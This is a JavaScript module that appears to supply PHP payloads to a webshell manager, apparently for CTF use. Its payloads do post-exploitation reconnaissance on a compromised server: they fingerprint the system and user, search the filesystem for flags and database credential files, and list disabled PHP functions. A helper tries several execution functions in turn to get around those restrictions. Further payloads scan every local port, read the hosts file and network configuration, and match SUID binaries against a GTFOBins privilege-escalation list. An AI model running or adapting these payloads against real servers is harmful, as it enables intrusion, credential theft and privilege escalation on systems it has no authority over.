module.exports = {
    BaseInfo: () => {
        return `
            $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
            $rt = array(
            "os" => php_uname('s'),
            "arch" => (PHP_INT_SIZE==4?32:64),
            "ver" => substr(PHP_VERSION,0,3),
            "shell_name" => basename($_SERVER['SCRIPT_NAME']),
            "shell_dir" => dirname($_SERVER['SCRIPT_FILENAME']),
            "phpself" => $_SERVER['DOCUMENT_ROOT'],
            "current_user" => ($u) ? $u["name"] : @get_current_user(),
        );
        echo json_encode($rt);
        `.replace(/\n\s+?/g, '');
    },
    dev_env_scan: () => {
        return `
            $tools = [
            'PHP' => [
                'cmd' => 'php -v',
                'parse' => function($output) { return phpversion(); }
            ],
            'cURL' => [
                'cmd' => 'curl --version',
                'parse' => function($output) {
                    return preg_match('/curl (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ],
            'Wget' => [
                'cmd' => 'wget --version',
                'parse' => function($output) {
                    return preg_match('/GNU Wget (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ],
            'Git' => [
                'cmd' => 'git --version',
                'parse' => function($output) {
                    return preg_match('/git version (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ],
            'Redis' => [
                'cmd' => 'redis-cli --version',
                'parse' => function($output) {
                    return preg_match('/redis-cli (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ],
            'Go' => [
                'cmd' => 'go version',
                'parse' => function($output) {
                    return preg_match('/go(\\d+\\.\\d+(\\.\\d+)?)/', $output, $m) ? $m[1] : null;
                }
            ],
            'MySQL' => [
                'cmd' => 'mysql --version',
                'parse' => function($output) {
                    return preg_match('/Ver (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ],
            'Python' => [
                'cmd' => 'python3 --version || python --version',
                'parse' => function($output) {
                    return preg_match('/Python (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
                }
            ]
        ];
        function safe_exec($cmd) {
            static $disabled;
            if (!isset($disabled)) {
                $disabled = explode(',', ini_get('disable_functions'));
            }
            
            foreach (['shell_exec', 'exec', 'passthru', 'system'] as $func) {
                if (!in_array($func, $disabled)) {
                    switch ($func) {
                        case 'shell_exec':
                            $output = @shell_exec("$cmd 2>&1");
                            return $output ? trim($output) : null;
                        case 'exec':
                            @exec("$cmd 2>&1", $output, $code);
                            return $code === 0 ? implode("\n", $output) : null;
                        case 'passthru':
                            ob_start();
                            @passthru("$cmd 2>&1", $code);
                            $output = ob_get_clean();
                            return $code === 0 ? trim($output) : null;
                        case 'system':
                            ob_start();
                            @system("$cmd 2>&1", $code);
                            $output = ob_get_clean();
                            return $code === 0 ? trim($output) : null;
                    }
                }
            }
            return null;
        }
        foreach ($tools as $name => $config) {
            $output = safe_exec($config['cmd']);
            $version = $output ? $config['parse']($output) : null;
            
            echo str_pad("$name:", 12, ' ', STR_PAD_RIGHT);
            echo $version ? "已安装 ($version)" : "未安装";
            echo "\n";
        }
        `;
    },
    fuzz_search: () => {
        return `
        echo "疑似flag路径：". "\n";
        echo shell_exec("find / -type f -name '*f*' -exec grep -l 'flag{' {} + 2>/dev/null");
        echo "\n";
        echo "疑似数据库敏感信息路径："."\n";
        $pattern = '/db_name|dbname|database/i';
        $directory = '/var/www/html';
        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory, RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);
        foreach ($iterator as $file) {
            // 跳过目录和非可读文件
            if ($file->isDir() || !$file->isReadable()) {
                continue;
            }

            $filePath = $file->getPathname();

            $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
            $allowedExtensions = ['php','js'];
            if (!in_array($extension, $allowedExtensions)) {
                continue;
            }
            $content = file_get_contents($filePath);
            if (preg_match($pattern, $content)) {
                echo "$filePath\n";
            }
        }
        `
    },
    ini_limit: () => {
        return `
        $disableFunctions = ini_get('disable_functions');
        $disableFunctionsList = $disableFunctions ? explode(',', $disableFunctions) : [];
        $openBasedir = ini_get('open_basedir');
        $openBasedirList = $openBasedir ? explode(':', $openBasedir) : [];

        echo "[disable_functions]";
        if (empty($disableFunctionsList)) {
            echo "未设置或未禁用任何函数\n";
        } else {
            echo "已禁用的函数列表:\n";
            foreach ($disableFunctionsList as $func) {
                echo "- " . trim($func) . "\n";
            }
        }

        echo "\n[open_basedir]";
        if (empty($openBasedirList)) {
            echo "未设置（无目录访问限制）\n";
        } else {
            echo "允许访问的目录:\n";
            foreach ($openBasedirList as $dir) {
                echo "- " . trim($dir) . "\n";
            }
        }
        `
    },
    ip_ports_scan:()=>{
        return `
        $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
        function getNetworkInfo($isWindows)
        {
            $output = '';
            $commands = [
                'linux' => ['ip addr', '/sbin/ifconfig', '/sbin/ip addr'],
                'windows' => ['ipconfig /all']
            ];
            $tryCommands = $isWindows ? $commands['windows'] : array_merge($commands['linux'],['ifconfig', 'ip addr show']);

            foreach ($tryCommands as $cmd) {
                if ($result = safeExecute($cmd)) {
                    $output .= "===== [Command: $cmd] =====\n$result\n\n";
                    break;
                }
            }

            return $output ?: "所有网络命令执行失败\n";
        }

        function getHostsContent($isWindows)
        {
            $hostsPaths = [
                'linux' => '/etc/hosts',
                'windows' => 'C:\Windows\System32\\drivers\etc\hosts'
            ];
            $path = $isWindows ? $hostsPaths['windows'] : $hostsPaths['linux'];

            if (is_readable($path)) {
                return @file_get_contents($path) ?: "无法读取 hosts 文件";
            }

            if (!$isWindows) {
                return safeExecute("cat /etc/hosts") ?: "hosts 文件读取失败";
            }
            return "无法获取 hosts 文件";
        }

        function safeExecute($command)
        {
            if (!function_exists('exec')) return null; // 检查函数是否可用

            $output = [];
            @exec("$command 2>&1", $output, $returnCode);

            if ($returnCode === 0 && !empty($output)) {
                return implode("\n", $output);
            }

            return null;
        }
        echo "=== 网络配置信息 ===\n";
        echo getNetworkInfo($isWindows);
        echo "\n=== Hosts 文件内容 ===\n";
        echo getHostsContent($isWindows);
        echo "\n=== 端口扫描 ===\n";
        function checkPort($host = '127.0.0.1', $port = 80, $timeout = 2)
        {
            try {
                $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
                if ($socket) {
                    fclose($socket);
                    return true;
                }
                return "连接失败: $errstr (错误码 $errno)";
            } catch (Exception $e) {
                return "异常: " . $e->getMessage();
            }
        }
        function portScanner($start = 1, $end = 1024)
        {
            echo "开始扫描端口 $start - $end ...\n";
            for ($port = $start; $port <= $end; $port++) {
                $result = checkPort('127.0.0.1', $port, 1);
                if ($result === true) {
                    $service = getservbyport($port, "tcp"); // 获取服务名称
                    echo "[+] 端口 $port/tcp 开放" . ($service ? " ($service)" : "") . "\n";
                }
            }
        }
        portScanner(1, 65535);
        `
    },
    privilege_scan:()=>{
        return `
        $SUID = "=== SUID检测 ===\n";
        echo $SUID;
        $output = shell_exec("find / -user root -perm -4000 -print 2>/dev/null");
        if(!$output){
        echo "未检测到具有SUID权限的文件";
        }else{
            echo $output;
            $GTFOBINS_LIST = ['7z', 'aa-exec', 'ab', 'agetty', 'alpine', 'ansible-playbook', 'ansible-test', 'aoss', 'apt-get', 'apt', 'ar', 'aria2c', 'arj', 'arp', 'as', 'ascii-xfr', 'ascii85', 'ash', 'aspell', 'at', 'atobm', 'awk', 'aws', 'base32', 'base58', 'base64', 'basenc', 'basez', 'bash', 'batcat', 'bc', 'bconsole', 'bpftrace', 'bridge', 'bundle', 'bundler', 'busctl', 'busybox', 'byebug', 'bzip2', 'c89', 'c99', 'cabal', 'cancel', 'capsh', 'cat', 'cdist', 'certbot', 'check_by_ssh', 'check_cups', 'check_log', 'check_memory', 'check_raid', 'check_ssl_cert', 'check_statusfile', 'chmod', 'choom', 'chown', 'chroot', 'clamscan', 'cmp', 'cobc', 'column', 'comm', 'composer', 'cowsay', 'cowthink', 'cp', 'cpan', 'cpio', 'cpulimit', 'crash', 'crontab', 'csh', 'csplit', 'csvtool', 'cupsfilter', 'curl', 'cut', 'dash', 'date', 'dd', 'debugfs', 'dialog', 'diff', 'dig', 'distcc', 'dmesg', 'dmidecode', 'dmsetup', 'dnf', 'docker', 'dos2unix', 'dosbox', 'dotnet', 'dpkg', 'dstat', 'dvips', 'easy_install', 'eb', 'ed', 'efax', 'elvish', 'emacs', 'env', 'eqn', 'espeak', 'ex', 'exiftool', 'expand', 'expect', 'facter', 'file', 'find', 'finger', 'fish', 'flock', 'fmt', 'fold', 'fping', 'ftp', 'gawk', 'gcc', 'gcloud', 'gcore', 'gdb', 'gem', 'genie', 'genisoimage', 'ghc', 'ghci', 'gimp', 'ginsh', 'git', 'grc', 'grep', 'gtester', 'gzip', 'hd', 'head', 'hexdump', 'highlight', 'hping3', 'iconv', 'iftop', 'install', 'ionice', 'ip', 'irb', 'ispell', 'jjs', 'joe', 'join', 'journalctl', 'jq', 'jrunscript', 'jtag', 'julia', 'knife', 'ksh', 'ksshell', 'ksu', 'kubectl', 'latex', 'latexmk', 'ld.so', 'ldconfig', 'less', 'lftp', 'ln', 'loginctl', 'logsave', 'look', 'lp', 'ltrace', 'lua', 'lualatex', 'luatex', 'lwp-download', 'lwp-request', 'mail', 'make', 'man', 'mawk', 'minicom', 'more', 'mosquitto', 'mount', 'msfconsole', 'msgattrib', 'msgcat', 'msgconv', 'msgfilter', 'msgmerge', 'msguniq', 'mtr', 'multitime', 'mv', 'mysql', 'nano', 'nasm', 'nawk', 'nc', 'ncftp', 'neofetch', 'nft', 'nice', 'nl', 'nm', 'nmap', 'node', 'nohup', 'npm', 'nroff', 'nsenter', 'octave', 'od', 'openssl', 'openvpn', 'openvt', 'opkg', 'pandoc', 'paste', 'pax', 'pdb', 'pdflatex', 'pdftex', 'perf', 'perl', 'perlbug', 'pexec', 'pg', 'php', 'pic', 'pico', 'pidstat', 'pip', 'pkexec', 'pkg', 'posh', 'pr', 'pry', 'psftp', 'psql', 'ptx', 'puppet', 'pwsh', 'python', 'rake', 'rc', 'readelf', 'red', 'redcarpet', 'redis', 'restic', 'rev', 'rlogin', 'rlwrap', 'rpm', 'rpmdb', 'rpmquery', 'rpmverify', 'rsync', 'rtorrent', 'ruby', 'run-mailcap', 'run-parts', 'runscript', 'rview', 'rvim', 'sash', 'scanmem', 'scp', 'screen', 'script', 'scrot', 'sed', 'service', 'setarch', 'setfacl', 'setlock', 'sftp', 'sg', 'shuf', 'slsh', 'smbclient', 'snap', 'socat', 'socket', 'soelim', 'softlimit', 'sort', 'split', 'sqlite3', 'sqlmap', 'ss', 'ssh-agent', 'ssh-keygen', 'ssh-keyscan', 'ssh', 'sshpass', 'start-stop-daemon', 'stdbuf', 'strace', 'strings', 'su', 'sysctl', 'systemctl', 'systemd-resolve', 'tac', 'tail', 'tar', 'task', 'taskset', 'tasksh', 'tbl', 'tclsh', 'tcpdump', 'tdbtool', 'tee', 'telnet', 'terraform', 'tex', 'tftp', 'tic', 'time', 'timedatectl', 'timeout', 'tmate', 'tmux', 'top', 'torify', 'torsocks', 'troff', 'tshark', 'ul', 'unexpand', 'uniq', 'unshare', 'unsquashfs', 'unzip', 'update-alternatives', 'uudecode', 'uuencode', 'vagrant', 'valgrind', 'vi', 'view', 'vigr', 'vim', 'vimdiff', 'vipw', 'virsh', 'volatility', 'w3m', 'wall', 'watch', 'wc', 'wget', 'whiptail', 'whois', 'wireshark', 'wish', 'xargs', 'xdg-user-dir', 'xdotool', 'xelatex', 'xetex', 'xmodmap', 'xmore', 'xpad', 'xxd', 'xz', 'yarn', 'yash', 'yelp', 'yum', 'zathura', 'zip', 'zsh', 'zsoelim', 'zypper'];
            $results = explode("\n",$output);
            $matches = [];
            echo "\n可能存在的提权命令：\n";
            foreach ($results as $path) {
                $filename = basename($path);
                if (in_array($filename, $GTFOBINS_LIST)) {
                    echo $filename."\n";
                }
            }
        }
        echo "\n=== Capabilities检测 ===\n";
        $output = shell_exec("getcap -r / 2>/dev/null");
        if(!$output){
        echo "未检测到具有Capabilities的文件";
        }else{
        echo $output;
        }
        `
    },
    process_scan:()=>{
        return `
        echo shell_exec("ps -ef");
        `
    },
}